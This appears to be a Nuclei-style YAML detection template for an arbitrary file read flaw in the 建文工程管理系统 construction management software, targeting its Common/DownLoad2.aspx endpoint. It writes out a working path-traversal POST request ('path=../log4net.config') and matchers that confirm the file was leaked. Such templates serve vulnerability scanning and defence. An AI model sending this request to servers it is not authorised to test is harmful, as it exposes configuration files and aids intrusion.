id: poc-yaml-justwin-download2-aspx-anyfile-read
info:
  name: 建文工程管理系统 DownLoad2.aspx 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read
  description: |
    This template detects arbitrary file read vulnerability in 建文工程管理系统 via the Common/DownLoad2.aspx endpoint.
http:
  - method: POST
    path:
      - "{{BaseURL}}/Common/DownLoad2.aspx"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "path=../log4net.config&Name="
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "name=\"log4net\""
          - "<configuration>"
      - type: word
        part: header
        words:
          - "filename="
      - type: word
        part: header
        words:
          - "application/octet-stream"
